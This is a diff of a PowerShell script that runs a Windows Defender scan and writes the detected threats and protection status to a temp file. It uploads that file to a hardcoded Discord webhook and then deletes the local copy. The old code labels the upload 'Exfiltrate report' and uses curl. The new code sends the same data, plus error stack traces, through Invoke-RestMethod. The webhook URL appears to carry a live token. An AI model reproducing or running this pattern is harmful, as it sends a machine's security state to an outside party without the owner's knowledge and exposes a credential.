@@ -2,36 +2,60 @@ $hook = "https://discord.com/api/webhooks/1366201501802041374/ENdipWjx_vaIQYHXDY
 $reportPath = "$env:TEMP\DefenderScan-$(Get-Date -f yyyyMMddHHmm).txt"
 
 try {
-    # Update definitions
-    Update-MpSignature
+    # Initialize report
+    "=== Windows Defender Scan Report ===" | Out-File $reportPath
+    "Scan started: $(Get-Date -Format u)" | Out-File $reportPath -Append
+
+    # Update signatures
+    Update-MpSignature -ErrorAction Stop
+    "Signature update completed" | Out-File $reportPath -Append
+
+    # Start scan with progress monitoring
+    $scan = Start-MpScan -ScanType FullScan -AsJob -ErrorAction Stop
     
-    # Run full scan
-    $scan = Start-MpScan -ScanType FullScan -AsJob
+    # Monitor scan status
     while ($scan.State -eq 'Running') {
-        Start-Sleep -Seconds 10
-        "Scan progress: $($scan.Progress)" | Out-File $reportPath -Append
+        $status = Get-MpComputerStatus
+        "Scan progress: $($status.FullScanProgress)%" | Out-File $reportPath -Append
+        Start-Sleep -Seconds 30
     }
 
-    # Get results
-    $threats = Get-MpThreat
+    # Get results using WMI for better reliability
+    $threats = Get-CimInstance -Namespace root/Microsoft/Windows/Defender -ClassName MSFT_MpThreat
+    
     if ($threats) {
-        "=== Detected Threats ===" | Out-File $reportPath
-        $threats | Format-Table -Property ThreatID,Resource,Severity | Out-File $reportPath -Append
-    } else {
-        "No threats detected" | Out-File $reportPath
+        "`n=== Detected Threats ===" | Out-File $reportPath -Append
+        $threats | Select-Object ThreatName,Path,Severity | Format-Table -AutoSize | Out-File $reportPath -Append
+    }
+    else {
+        "`nNo threats detected" | Out-File $reportPath -Append
     }
 
     # Add protection status
     "`n=== Protection Status ===" | Out-File $reportPath -Append
-    Get-MpComputerStatus | Select-Object RealTimeProtectionEnabled,AntivirusSignatureAge | Out-File $reportPath -Append
+    Get-MpComputerStatus | Select-Object AntivirusEnabled,AntivirusSignatureAge,RealTimeProtectionEnabled | Format-List | Out-File $reportPath -Append
 
-    # Exfiltrate report
-    curl.exe -F "file1=@$reportPath" $hook
+    # Send report via native PowerShell
+    $fileBytes = [System.IO.File]::ReadAllBytes($reportPath)
+    $boundary = [System.Guid]::NewGuid().ToString()
+    $body = @(
+        "--$boundary",
+        "Content-Disposition: form-data; name=`"file`"; filename=`"$(Split-Path $reportPath -Leaf)`"",
+        "Content-Type: application/octet-stream",
+        "",
+        [System.Convert]::ToBase64String($fileBytes),
+        "--$boundary--"
+    ) -join "`r`n"
+
+    Invoke-RestMethod -Uri $hook -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body $body
 }
 catch {
-    "Scan failed: $_" | Out-File $reportPath
-    curl.exe -F "file1=@$reportPath" $hook
+    $errorMsg = "ERROR: $($_.Exception.Message)`nStack Trace: $($_.ScriptStackTrace)"
+    $errorMsg | Out-File $reportPath -Append
+    Invoke-RestMethod -Uri $hook -Method Post -Body @{ content = $errorMsg } -ErrorAction SilentlyContinue
 }
 finally {
-    Remove-Item $reportPath -Force -ErrorAction SilentlyContinue
+    if (Test-Path $reportPath) {
+        Remove-Item $reportPath -Force -ErrorAction SilentlyContinue
+    }
 }
